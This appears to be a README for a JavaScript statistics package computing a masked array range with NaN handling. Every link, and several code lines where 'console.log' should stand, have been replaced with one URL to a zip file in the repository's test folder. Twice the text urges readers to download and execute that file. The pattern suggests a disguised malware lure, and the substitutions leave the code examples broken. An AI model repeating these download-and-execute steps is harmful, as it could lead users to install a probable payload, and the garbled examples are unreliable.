# Calculate Array Range with Masking for NaN Values in JavaScript

![GitHub release](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) [![npm](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip)](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip)

## Overview

The `stats-array-nanmskrange` repository provides a simple and effective way to calculate the range of an array while ignoring `NaN` values based on a specified mask. This tool is useful in statistical analysis, data science, and any situation where clean data is essential for accurate calculations.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Functionality](#functionality)
- [API Reference](#api-reference)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Installation

To install the package, you can use npm. Run the following command in your terminal:

```bash
npm install stats-array-nanmskrange
```

For the latest releases, visit [Releases](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) to download and execute the necessary files.

## Usage

To use the library, first import it into your JavaScript file:

```javascript
const { maskedRange } = require('stats-array-nanmskrange');
```

Then, you can call the `maskedRange` function with your array and mask:

```javascript
const array = [1, 2, NaN, 4, 5];
const mask = [true, true, false, true, true];

const range = maskedRange(array, mask);
https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(range); // Outputs the range while ignoring NaN
```

## Functionality

The main function, `maskedRange`, calculates the range of an array based on a mask. Here’s how it works:

- **Input Array**: This is the array from which you want to calculate the range.
- **Mask**: A boolean array that indicates which elements to include in the calculation. Elements corresponding to `true` in the mask are included, while those corresponding to `false` are ignored.
- **NaN Handling**: The function automatically ignores any `NaN` values in the input array.

### Key Features

- Efficiently calculates the maximum and minimum values.
- Ignores `NaN` values to ensure accurate results.
- Simple API that integrates easily into existing projects.

## API Reference

### maskedRange(array, mask)

- **Parameters**:
  - `array` (Array): The input array of numbers.
  - `mask` (Array): A boolean array indicating which elements to consider.
  
- **Returns**: An object containing the minimum and maximum values, and the calculated range.

- **Example**:

```javascript
const result = maskedRange([1, 2, NaN, 4, 5], [true, true, false, true, true]);
https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 1, max: 5, range: 4 }
```

## Examples

Here are some examples to demonstrate how to use the `maskedRange` function effectively.

### Example 1: Basic Usage

```javascript
const array = [3, NaN, 7, 2, 5];
const mask = [true, false, true, true, true];

const result = maskedRange(array, mask);
https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 2, max: 7, range: 5 }
```

### Example 2: All NaN Values

```javascript
const array = [NaN, NaN, NaN];
const mask = [true, true, true];

const result = maskedRange(array, mask);
https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: NaN, max: NaN, range: NaN }
```

### Example 3: Mixed Values

```javascript
const array = [10, 20, NaN, 5, 15];
const mask = [true, true, false, true, false];

const result = maskedRange(array, mask);
https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 5, max: 20, range: 15 }
```

## Contributing

We welcome contributions to enhance the functionality of this library. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature/YourFeature`).
6. Open a Pull Request.

### Code of Conduct

Please adhere to our [Code of Conduct](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) in all interactions within the community.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support

For support, please open an issue in the GitHub repository. We will address your concerns as soon as possible.

For the latest releases, visit [Releases](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) to download and execute the necessary files.

## Topics

This repository covers various topics related to statistical analysis and array manipulation. Here are some relevant keywords:

- **Array**: Fundamental data structure for storing lists of items.
- **Dispersion**: Measure of how spread out the values are.
- **Domain**: The set of possible values for the input array.
- **Extent**: The range of values from minimum to maximum.
- **Extremes**: The highest and lowest values in the array.
- **JavaScript**: The programming language used for this library.
- **Masked**: Refers to the use of a mask to filter values.
- **Math**: Underlying principles of mathematics applied in this library.
- **Maximum**: The highest value in the selected range.
- **Minimum**: The lowest value in the selected range.
- **https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip**: JavaScript runtime used for server-side applications.
- **Range**: The difference between the maximum and minimum values.
- **Statistics**: The science of collecting, analyzing, and interpreting data.
- **Stdlib**: Standard library that may provide additional mathematical functions.

Feel free to explore the repository, and make use of the tools provided to enhance your data analysis tasks.